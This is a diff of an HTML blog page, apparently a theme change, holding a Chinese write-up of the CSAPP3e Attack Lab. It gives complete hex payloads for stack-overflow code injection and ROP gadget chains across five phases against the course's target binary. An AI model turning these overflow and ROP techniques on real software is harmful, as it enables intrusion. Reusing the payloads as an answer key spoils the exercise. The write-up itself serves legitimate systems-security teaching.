@@ -1,7 +1,32 @@
-<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>CSAPP3e:Attacklab - hhdx's blog</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="hhdx"><meta name=description content="简介 这是CSAPP这本书的第三个实验，实验所需要的材料在 CSAPP3e。
+<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CSAPP3e:Attacklab | hhdx's blog</title>
+<meta name=keywords content="CSAPP"><meta name=description content="简介
+这是CSAPP这本书的第三个实验，实验所需要的材料在 CSAPP3e。
+这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。
+Code injection attacks
+Phase 1
+实验目的是test()函数调用getbuf()后执行touch1()函数而不返回test()，所以这里用touch1()的地址覆盖掉test()的地址就可以。getbuf()里面分配了0x28个字节栈空间，所以这里把栈顶的0x28个字节覆盖掉，在末尾添加touch1()的地址就可以了。需要注意字节顺序。
+
+
+1
+2
+3
+4
+5
+6
+
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
+
+
+"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/csapp3e-attacklab/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/csapp3e-attacklab/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/csapp3e-attacklab/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="CSAPP3e:Attacklab"><meta property="og:description" content="简介 这是CSAPP这本书的第三个实验，实验所需要的材料在 CSAPP3e。
 这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。
 Code injection attacks Phase 1 实验目的是test()函数调用getbuf()后执行touch1()函数而不返回test()，所以这里用touch1()的地址覆盖掉test()的地址就可以。getbuf()里面分配了0x28个字节栈空间，所以这里把栈顶的0x28个字节覆盖掉，在末尾添加touch1()的地址就可以了。需要注意字节顺序。
-1 2 3 4 5 6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 /* 0x4017c0 即为touch1()起始地址*/ "><meta name=keywords content="C language,CTF,system software engineer"><meta name=generator content="Hugo 0.116.1 with theme even"><link rel=canonical href=https://hhdx.xyz/post/csapp3e-attacklab/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/sass/main.min.bda6190ea12800aa36851bdb7b5cb5af46ca988222781d28b20a96aa4c1f6e68.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="CSAPP3e:Attacklab"><meta property="og:description" content="简介
+1 2 3 4 5 6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 /* 0x4017c0 即为touch1()起始地址*/ "><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-03-22T21:20:38+00:00"><meta property="article:modified_time" content="2018-03-22T21:20:38+00:00"><meta property="article:tag" content="CSAPP"><meta name=twitter:card content="summary"><meta name=twitter:title content="CSAPP3e:Attacklab"><meta name=twitter:description content="简介
 这是CSAPP这本书的第三个实验，实验所需要的材料在 CSAPP3e。
 这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。
 Code injection attacks
@@ -25,58 +50,7 @@ Phase 1
 c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
 
 
-"><meta property="og:type" content="article"><meta property="og:url" content="https://hhdx.xyz/post/csapp3e-attacklab/"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-03-22T21:20:38+00:00"><meta property="article:modified_time" content="2018-03-22T21:20:38+00:00"><meta itemprop=name content="CSAPP3e:Attacklab"><meta itemprop=description content="简介
-这是CSAPP这本书的第三个实验，实验所需要的材料在 CSAPP3e。
-这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。
-Code injection attacks
-Phase 1
-实验目的是test()函数调用getbuf()后执行touch1()函数而不返回test()，所以这里用touch1()的地址覆盖掉test()的地址就可以。getbuf()里面分配了0x28个字节栈空间，所以这里把栈顶的0x28个字节覆盖掉，在末尾添加touch1()的地址就可以了。需要注意字节顺序。
-
-
-1
-2
-3
-4
-5
-6
-
-
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
-
-
-"><meta itemprop=datePublished content="2018-03-22T21:20:38+00:00"><meta itemprop=dateModified content="2018-03-22T21:20:38+00:00"><meta itemprop=wordCount content="1843"><meta itemprop=keywords content="CSAPP,"><meta name=twitter:card content="summary"><meta name=twitter:title content="CSAPP3e:Attacklab"><meta name=twitter:description content="简介
-这是CSAPP这本书的第三个实验，实验所需要的材料在 CSAPP3e。
-这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。
-Code injection attacks
-Phase 1
-实验目的是test()函数调用getbuf()后执行touch1()函数而不返回test()，所以这里用touch1()的地址覆盖掉test()的地址就可以。getbuf()里面分配了0x28个字节栈空间，所以这里把栈顶的0x28个字节覆盖掉，在末尾添加touch1()的地址就可以了。需要注意字节顺序。
-
-
-1
-2
-3
-4
-5
-6
-
-
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
-
-
-"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
-<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>hhdx's blog</a></div><div class=mobile-navbar-icon><span></span>
-<span></span>
-<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>主页</li></a><a href=/post/><li class=mobile-menu-item>归档</li></a><a href=/tags/><li class=mobile-menu-item>标签</li></a><a href=/links/><li class=mobile-menu-item>链接</li></a><a href=/underway/><li class=mobile-menu-item>施工中</li></a><a href=/about/><li class=mobile-menu-item>关于</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>hhdx's blog</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>主页</a></li><li class=menu-item><a class=menu-item-link href=/post/>归档</a></li><li class=menu-item><a class=menu-item-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-item-link href=/links/>链接</a></li><li class=menu-item><a class=menu-item-link href=/underway/>施工中</a></li><li class=menu-item><a class=menu-item-link href=/about/>关于</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>CSAPP3e:Attacklab</h1><div class=post-meta><span class=post-time>2018-03-22</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#简介>简介</a></li><li><a href=#code-injection-attacks>Code injection attacks</a><ul><li><a href=#phase-1>Phase 1</a></li><li><a href=#phase-2>Phase 2</a></li><li><a href=#phase-3>Phase 3</a></li></ul></li><li><a href=#return-oriented-programming-面向返回编程>Return-Oriented Programming 面向返回编程</a><ul><li><a href=#phase-4>Phase 4</a></li><li><a href=#phase-5>Phase 5</a></li></ul></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=简介>简介</h2><p>这是CSAPP这本书的第三个实验，实验所需要的材料在 <a href=http://csapp.cs.cmu.edu/3e/labs.html>CSAPP3e</a>。</p><p>这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。</p><h2 id=code-injection-attacks>Code injection attacks</h2><h3 id=phase-1>Phase 1</h3><p>实验目的是test()函数调用getbuf()后执行touch1()函数而不返回test()，所以这里用touch1()的地址覆盖掉test()的地址就可以。getbuf()里面分配了0x28个字节栈空间，所以这里把栈顶的0x28个字节覆盖掉，在末尾添加touch1()的地址就可以了。需要注意字节顺序。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"CSAPP3e:Attacklab","item":"https://hhdx.xyz/post/csapp3e-attacklab/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CSAPP3e:Attacklab","name":"CSAPP3e:Attacklab","description":"简介 这是CSAPP这本书的第三个实验，实验所需要的材料在 CSAPP3e。\n这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。\nCode injection attacks Phase 1 实验目的是test()函数调用getbuf()后执行touch1()函数而不返回test()，所以这里用touch1()的地址覆盖掉test()的地址就可以。getbuf()里面分配了0x28个字节栈空间，所以这里把栈顶的0x28个字节覆盖掉，在末尾添加touch1()的地址就可以了。需要注意字节顺序。\n1 2 3 4 5 6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 /* 0x4017c0 即为touch1()起始地址*/ ","keywords":["CSAPP"],"articleBody":"简介 这是CSAPP这本书的第三个实验，实验所需要的材料在 CSAPP3e。\n这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。\nCode injection attacks Phase 1 实验目的是test()函数调用getbuf()后执行touch1()函数而不返回test()，所以这里用touch1()的地址覆盖掉test()的地址就可以。getbuf()里面分配了0x28个字节栈空间，所以这里把栈顶的0x28个字节覆盖掉，在末尾添加touch1()的地址就可以了。需要注意字节顺序。\n1 2 3 4 5 6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 /* 0x4017c0 即为touch1()起始地址*/ Phase 2 实验目的是test()函数调用getbuf()函数后执行touch2(unsigned val)函数，touch2()函数是需要有参数(cookie值)的，所以在执行touch2()之前传入参数到%rdi，这是就需要注入代码了。\n1 2 3 4 5 48 c7 c7 fa 97 b9 59 /* mov $0x59b997fa,%rdi 传入cookie值*/ 68 ec 17 40 00 /* pushq $0x4017ec touch2地址*/ c3 /* retq */ 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 /* 填充 */ 78 dc 61 55 00 00 00 00 /*栈内指令起始地址 */ Phase 3 这里需要执行touch3(char * sval)，这里的参数是cookie的字符串的起始地址。touch3()通过调用hexmatch()来校验cookie()，这里尤其要注意字符串存放的地址，因为touch3()和hexmatch()会使用堆栈需要避免字符串位置被覆盖。我这里把字符串存到了hexmatch()函数的堆栈内。通过看hexmatch()的反汇编代码可以发现该函数分配了0x80（128）个字节的栈空间给自己使用（pushq占用的未计算），栈底部的8个字节存放的canary值来避免堆栈溢出所带来的危害，顶部的110个字节来给buf变量使用，所以我就把cookie的字符串存到了中间10个字节里。\n1 2 3 4 5 6 7 8 9 10 11 50 /* pushq %rax */ 48 c7 c7 69 dc 61 55 /* mov $0x5561dc69,%rdi 把字符串的起始地址村放入rdi */ 48 b8 35 39 62 39 39 /* movq $0x6166373939623935,%rax */ 37 66 61 48 89 07 /* movq %rax,(%rdi) 把字符串存放到指定位置*/ c6 47 08 00 /* movb $0x0,0x8(%rdi) 在字符串末尾添加'\\0' */ 58 /* popq %rax 没有必要保护%rax好像。。。*/ 68 fa 18 40 00 /* pushq $0x4018fa touch3()地址入栈*/ c3 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 Return-Oriented Programming 面向返回编程 Phase 4 这里是利用ROP来实现Phase2的内容，这里只需要传入cookie值和相应指令在栈就好。限制只能使用movq，popq，nop，ret指令\n1 2 3 4 5 6 7 8 9 10 栈顶 popq %rax 0x4019ab cookie 0x59b997fa movq %rax,%rdi 0x4019a2 touch2 addresss 0x4017ec 栈底 所以可以得到以下\n1 2 3 4 5 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 填充 */ ab 19 40 00 00 00 00 00 /* popq %rax */ fa 97 b9 59 00 00 00 00 /* cookie */ a2 19 40 00 00 00 00 00 /* movq %rax,%rdi */ ec 17 40 00 00 00 00 00 /* rouch2 */ Phase 5 实现和Phase3一样的效果调用touch3(char * sval)。因为需要传入字符串地址，所以这里有一些难。通过对farm段指令代码分析可以得知有以下可以利用的指令\n1 2 3 4 5 6 7 8 9 movq %rsp, %rax movq %rax, %rdi popq %rax movl %eax, %edi movl %eax, %edx movl %ecx, %esi movl %edx, %ecx （后边有不相关指令粘连） movl %esp, %eax lea （%rdi, %rsi, 1), %rax （这是至关重要的，这个是原来就存在的指令不是截取的） 所以可以通过rsp+offset的方法确定字符串位置。rsp由movq传递。movl传递offset，因为movl会清零高四字节的内容所以不必担心会有影响。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 栈顶 movq %rsp, %rax 0x401a06 movq %rax, %rdi 0x4019c5 popq %rax 0x4019ab offset 0x48 movl %eax, %edx 0x4019dd movl %edx, %ecx 0x401a69sval movl %ecx, %esi 0x401a13 lea (%rdi, %rsi, 1), %rax 0x4019d6 movq %rax, %rdi 0x4019c5 touch3 address 0x4018fa cookie string 0x6166373939623935 栈底 由分析可知字符串位置安全不会被干扰。由此可得以下答案。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 ","wordCount":"1843","inLanguage":"zh-cn","datePublished":"2018-03-22T21:20:38Z","dateModified":"2018-03-22T21:20:38Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/csapp3e-attacklab/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=主页><span>主页</span></a></li><li><a href=https://hhdx.xyz/post/ title=归档><span>归档</span></a></li><li><a href=https://hhdx.xyz/tags/ title=标签><span>标签</span></a></li><li><a href=https://hhdx.xyz/underway/ title=施工中><span>施工中</span></a></li><li><a href=https://hhdx.xyz/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">CSAPP3e:Attacklab</h1><div class=post-meta><span title='2018-03-22 21:20:38 +0000 UTC'>March 22, 2018</span>&nbsp;·&nbsp;hhdx</div></header><div class=post-content><h2 id=简介>简介<a hidden class=anchor aria-hidden=true href=#简介>#</a></h2><p>这是CSAPP这本书的第三个实验，实验所需要的材料在 <a href=http://csapp.cs.cmu.edu/3e/labs.html>CSAPP3e</a>。</p><p>这个实验分为两部分，第一部分是代码注入实验，主要是通过Gets()函数的堆栈溢出传入指令，然后跳转到指定位置执行的方式来实现执行指定指令；第二部分是ROP实验，因为这里采用栈随机化和堆栈不可执行所以代码注入失效了。ROP利用截取已知某指令序列来创建目的指令的方法来实现的，其中在实验中可利用的指令序列限制为farm.c生成的部分，通过Gets()函数的堆栈溢出传入一系列指令地址和数据实现。</p><h2 id=code-injection-attacks>Code injection attacks<a hidden class=anchor aria-hidden=true href=#code-injection-attacks>#</a></h2><h3 id=phase-1>Phase 1<a hidden class=anchor aria-hidden=true href=#phase-1>#</a></h3><p>实验目的是test()函数调用getbuf()后执行touch1()函数而不返回test()，所以这里用touch1()的地址覆盖掉test()的地址就可以。getbuf()里面分配了0x28个字节栈空间，所以这里把栈顶的0x28个字节覆盖掉，在末尾添加touch1()的地址就可以了。需要注意字节顺序。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
@@ -88,7 +62,7 @@ c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
 </span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
 </span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
 </span></span><span class=line><span class=cl>c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
-</span></span></code></pre></td></tr></table></div></div><h3 id=phase-2>Phase 2</h3><p>实验目的是test()函数调用getbuf()函数后执行touch2(unsigned val)函数，touch2()函数是需要有参数(cookie值)的，所以在执行touch2()之前传入参数到%rdi，这是就需要注入代码了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></span></code></pre></td></tr></table></div></div><h3 id=phase-2>Phase 2<a hidden class=anchor aria-hidden=true href=#phase-2>#</a></h3><p>实验目的是test()函数调用getbuf()函数后执行touch2(unsigned val)函数，touch2()函数是需要有参数(cookie值)的，所以在执行touch2()之前传入参数到%rdi，这是就需要注入代码了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
@@ -98,7 +72,7 @@ c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
 </span></span><span class=line><span class=cl>c3                         /* retq */
 </span></span><span class=line><span class=cl>58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58  /* 填充 */
 </span></span><span class=line><span class=cl>78 dc 61 55 00 00 00 00    /*栈内指令起始地址 */
-</span></span></code></pre></td></tr></table></div></div><h3 id=phase-3>Phase 3</h3><p>这里需要执行touch3(char * sval)，这里的参数是cookie的字符串的起始地址。touch3()通过调用hexmatch()来校验cookie()，这里尤其要注意字符串存放的地址，因为touch3()和hexmatch()会使用堆栈需要避免字符串位置被覆盖。我这里把字符串存到了hexmatch()函数的堆栈内。通过看hexmatch()的反汇编代码可以发现该函数分配了0x80（128）个字节的栈空间给自己使用（pushq占用的未计算），栈底部的8个字节存放的canary值来避免堆栈溢出所带来的危害，顶部的110个字节来给buf变量使用，所以我就把cookie的字符串存到了中间10个字节里。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></span></code></pre></td></tr></table></div></div><h3 id=phase-3>Phase 3<a hidden class=anchor aria-hidden=true href=#phase-3>#</a></h3><p>这里需要执行touch3(char * sval)，这里的参数是cookie的字符串的起始地址。touch3()通过调用hexmatch()来校验cookie()，这里尤其要注意字符串存放的地址，因为touch3()和hexmatch()会使用堆栈需要避免字符串位置被覆盖。我这里把字符串存到了hexmatch()函数的堆栈内。通过看hexmatch()的反汇编代码可以发现该函数分配了0x80（128）个字节的栈空间给自己使用（pushq占用的未计算），栈底部的8个字节存放的canary值来避免堆栈溢出所带来的危害，顶部的110个字节来给buf变量使用，所以我就把cookie的字符串存到了中间10个字节里。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -120,7 +94,7 @@ c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
 </span></span><span class=line><span class=cl>c3                     
 </span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00 
 </span></span><span class=line><span class=cl>78 dc 61 55 00 00 00 00
-</span></span></code></pre></td></tr></table></div></div><h2 id=return-oriented-programming-面向返回编程>Return-Oriented Programming 面向返回编程</h2><h3 id=phase-4>Phase 4</h3><p>这里是利用ROP来实现Phase2的内容，这里只需要传入cookie值和相应指令在栈就好。限制只能使用movq，popq，nop，ret指令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></span></code></pre></td></tr></table></div></div><h2 id=return-oriented-programming-面向返回编程>Return-Oriented Programming 面向返回编程<a hidden class=anchor aria-hidden=true href=#return-oriented-programming-面向返回编程>#</a></h2><h3 id=phase-4>Phase 4<a hidden class=anchor aria-hidden=true href=#phase-4>#</a></h3><p>这里是利用ROP来实现Phase2的内容，这里只需要传入cookie值和相应指令在栈就好。限制只能使用movq，popq，nop，ret指令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -150,7 +124,7 @@ c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
 </span></span><span class=line><span class=cl>fa 97 b9 59 00 00 00 00  /* cookie */
 </span></span><span class=line><span class=cl>a2 19 40 00 00 00 00 00  /* movq %rax,%rdi */
 </span></span><span class=line><span class=cl>ec 17 40 00 00 00 00 00  /* rouch2 */
-</span></span></code></pre></td></tr></table></div></div><h3 id=phase-5>Phase 5</h3><p>实现和Phase3一样的效果调用touch3(char * sval)。因为需要传入字符串地址，所以这里有一些难。通过对farm段指令代码分析可以得知有以下可以利用的指令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></span></code></pre></td></tr></table></div></div><h3 id=phase-5>Phase 5<a hidden class=anchor aria-hidden=true href=#phase-5>#</a></h3><p>实现和Phase3一样的效果调用touch3(char * sval)。因为需要传入字符串地址，所以这里有一些难。通过对farm段指令代码分析可以得知有以下可以利用的指令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
@@ -252,23 +226,8 @@ c0 17 40 00 00 00 00 00    /* 0x4017c0 即为touch1()起始地址*/
 </span></span><span class=line><span class=cl>fa 18 40 00 00 00 00 00
 </span></span><span class=line><span class=cl>35 39 62 39 39 37 66 61
 </span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
-</span></span></code></pre></td></tr></table></div></div></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
-<span class=item-content>hhdx</span></p><p class=copyright-item><span class=item-title>上次更新</span>
